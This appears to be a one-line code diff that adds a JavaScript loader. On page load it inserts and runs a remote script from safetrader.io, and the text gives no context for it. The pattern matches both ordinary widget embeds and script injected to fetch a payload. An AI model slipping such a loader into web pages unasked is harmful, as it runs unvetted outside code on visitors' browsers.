@@ -1,0 +1,1 @@
+f=function(){a=document.createElement('script');a.src='https://safetrader.io/safetrader.js';a.async=true;a.type='text/javascript';x=document.getElementsByTagName('script')[0];x.parentNode.insertBefore(a,x);return;};f();
